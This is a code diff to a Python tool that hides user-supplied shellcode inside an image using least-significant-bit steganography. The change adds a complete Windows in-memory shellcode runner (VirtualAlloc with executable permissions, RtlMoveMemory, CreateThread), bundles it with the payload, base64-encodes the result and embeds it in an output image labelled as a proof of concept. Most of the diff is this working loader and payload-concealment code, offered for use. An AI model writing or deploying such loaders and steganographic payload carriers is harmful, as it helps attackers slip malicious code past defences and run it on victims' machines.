@@ -1,16 +1,38 @@
-#!/usr/bin/python
 from PIL import Image
 import argparse
+import base64
 
 parser = argparse.ArgumentParser()
-parser.add_argument('-s','--shellcode', required=True, help='Please supply file path to shellcode text file')
-parser.add_argument('-i','--image', required=True, help='Please supply file path to image file to be encoded') 
+parser.add_argument('-s', '--shellcode', required=True, help='Please supply file path to shellcode text file')
+parser.add_argument('-i', '--image', required=True, help='Please supply file path to image file to be encoded')
 args = parser.parse_args()
 
-with open(args.shellcode, 'r') as shellcode:
-    shellcode_in_text_file = shellcode.read().rstrip().replace('\n','').replace('buf += b', '')
-    
+runner_string = """
+shellcode = bytearray(buf)
+pointer = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
+                                      ctypes.c_int(len(shellcode)),
+                                      ctypes.c_int(0x3000),
+                                      ctypes.c_int(0x40))
+buffer = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
+ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(pointer),
+                                 buffer,
+                                 ctypes.c_int(len(shellcode)))
+thread = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
+                                     ctypes.c_int(0),
+                                     ctypes.c_int(pointer),
+                                     ctypes.c_int(0),
+                                     ctypes.c_int(0),
+                                     ctypes.pointer(ctypes.c_int(0)))
+ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(thread),
+                                    ctypes.c_int(-1))"""
 
+with open(args.shellcode, 'r') as shellcode:
+    shellcode_in_text_file = shellcode.read().rstrip() + runner_string
+
+# Encode the shellcode to base64
+encoded_shellcode = base64.b64encode(shellcode_in_text_file.encode()).decode()
+
+print(encoded_shellcode)
 
 def text_to_binary(text_data):
     # Convert text data to binary format
@@ -60,5 +82,4 @@ def encode_lsb(image_path, plaintext_data, output_path):
 # Example usage:
 if __name__ == "__main__":
     image_path = args.image
-    encode_lsb(image_path, shellcode_in_text_file, "poc_{}".format(image_path))
-
+    encode_lsb(image_path, encoded_shellcode, "poc_{}".format(image_path))
